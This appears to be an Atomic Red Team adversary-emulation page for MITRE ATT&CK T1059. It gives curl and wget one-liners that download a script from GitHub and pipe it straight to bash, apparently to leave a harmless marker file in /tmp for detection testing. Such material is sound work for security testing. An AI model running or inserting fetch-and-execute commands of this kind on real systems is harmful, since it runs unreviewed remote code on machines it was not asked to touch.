# Command-Line Interface

## MITRE ATT&CK Technique:
	[T1059](https://attack.mitre.org/wiki/Technique/T1059)

## Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

    bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Linux/Payloads/echo-art-fish.sh | bash"


## Using Wget for equivalent functionality.

    bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Linux/Payloads/echo-art-fish.sh | bash"

## This will download the specified payload and set a marker file in `/tmp/art-fish.txt`.
